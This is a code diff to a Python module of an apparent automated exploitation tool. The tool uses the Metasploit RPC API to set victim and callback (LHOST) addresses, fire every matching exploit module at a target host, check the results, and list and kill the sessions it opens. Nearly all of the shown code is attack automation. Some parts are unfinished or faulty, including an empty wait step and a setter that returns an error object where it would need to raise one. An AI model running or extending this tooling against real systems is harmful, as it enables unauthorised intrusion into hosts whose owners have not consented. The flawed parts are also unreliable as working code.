@@ -1,7 +1,9 @@
 import socket
+from random import randint
 from pymetasploit3.msfrpc import MsfRpcClient
 from pprint import pprint
 from autopwn.util import acid
+from ..const import MSFLHOST
 from ..util.msf import (
     splitmodule,
     verifyJob
@@ -12,9 +14,11 @@ import logging
 
 class Service(object):
 
-    def __init__(self):
+    def __init__(self, autopwn):
 
-        self._msfrpcd = None
+        self._autopwn = autopwn
+        self._msfrpcd = self._autopwn._msfrpcd
+        self.LHOST = MSFLHOST
         self.log = logging.getLogger(self.__class__.__name__)
 
     def msfcore(self):
@@ -26,23 +30,36 @@ class Service(object):
         mType, mPath = splitmodule(module)
         pwn = self._msfrpcd.modules.use(mType, mPath)
         pwn['RPORT'] = self.ports[0]  # Change self.port from a list to single entry
-        pwn['payload'] = self.payload
+        if "CPORT" in pwn.options:
+            pwn["CPORT"] = self.LPORT
         pprint(pwn.options)
         pprint(pwn.targetpayloads())
-        self.log.info("Payloads fired!".format(pwn.name))
-        return pwn.execute()
+
+        self.log.info("Firing payload!".format(pwn.name))
+        cid = self._msfrpcd.consoles.console().cid
+        result = self._msfrpcd.consoles.console(cid).run_module_with_output(pwn)
+        #result = self._msfrpcd.consoles.console(cid).run_cmd_with_output(pwn, payload=self.payload)
+        #result = pwn.execute(payload=self.payload)
+        self.log.debug("Result: {}".format(result))
+        # Verify result
+        if not verifyJob(result):
+            self.log.info("Exploit failed...")
+            return False
+
+        # Wait on exploit to finish
+
 
     def exploitall(self, host):
         self.log.debug(f"Performing {self.name} acid test")
         acid.check_port(host, self.ports)
+
         self.log.debug("Sending all exploits for {}".format(self.name))
         self.victim = host
+
         for i in self.exploits:
             result = self.exploit(i)
             self.log.debug("Result: {}".format(result))
-            if not verifyJob(result):
-                self.log.info("Exploit failed...")
-                pass
+        self._msfrpcd.consoles.sessionkill()
 
     def acid_test(self, host):
         raise NotImplementedError("Can't run acid_test on base class")
@@ -65,13 +82,15 @@ class Service(object):
                         )
                     )
 
-    def shells(self):
+    def sessions(self):
         """ List sessions """
-        return
+        return self._msfrpcd.sessions.list
 
-    def attach(self):
+    def attach(self, sessId):
         """ Attach to a session"""
-        return
+        for i in self.sessions():
+            self.log.debug(i)
+            self.log.info("Found session!")
 
     def detach(self):
         """ Kill a session """
@@ -86,6 +105,8 @@ class Service(object):
             return [s for s in self._msfrpcd.modules.exploits if keyword.lower() in s]
         return self._msfrpcd.modules.exploits
 
+    def randPort(self):
+        return randint(40000, 55000)
 
     """ Properties """
 
@@ -100,6 +121,17 @@ class Service(object):
         self._victim = host
         self._msfrpcd.core.setg("RHOSTS", host)
         self._msfrpcd.core.setg("RHOST", host)
+
+    @property
+    def LHOST(self):
+        return self._LHOST
+
+    @LHOST.setter
+    def LHOST(self, host):
+        if not isinstance(host, str):
+            return TypeError("Must provide an IP address string")
+        self._LHOST = host
+        self._msfrpcd.core.setg("LHOST", host)
 
     @property
     def auxiliary(self):
